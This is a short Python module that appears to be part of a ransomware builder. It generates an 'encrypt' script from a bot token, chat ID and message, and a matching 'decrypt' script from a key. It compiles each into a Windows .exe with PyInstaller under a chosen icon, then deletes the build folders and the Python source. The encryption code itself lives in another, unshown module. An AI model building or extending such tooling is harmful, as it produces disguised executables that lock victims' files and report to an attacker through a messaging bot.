from create_py_file import create_encrypt_script_file, create_decrypt_script_file
from subprocess import check_output
import shutil, os


def create_encrypt_execution_file(token, chat_id, message, name, icon_name):
    create_encrypt_script_file(token, chat_id, message, name)
    generate_steps(name, icon_name)


def create_decrypt_execution_file(key, name, icon_name):
    create_decrypt_script_file(key, name)
    generate_steps(name, icon_name)


def generate_steps(name, icon_name):
    generate_execution_file(name, icon_name)
    move_execution_file(name)
    remove_extra_directory()
    remove_extra_files(name)


def generate_execution_file(name, icon_name):
    # generete .exe file
    check_output(f'pyinstaller render\\{name}.py -i icons\\{icon_name}.ico ')


def move_execution_file(name):
    # move the file to render directory
    source = f'dist\\{name}\\{name}.exe'
    destination = 'render'
    shutil.move(source, destination)


def remove_extra_directory():
    # remove extra directories
    shutil.rmtree('build')
    shutil.rmtree('dist')


def remove_extra_files(name):
    # remove .py file
    os.remove(f'render\\{name}.py')
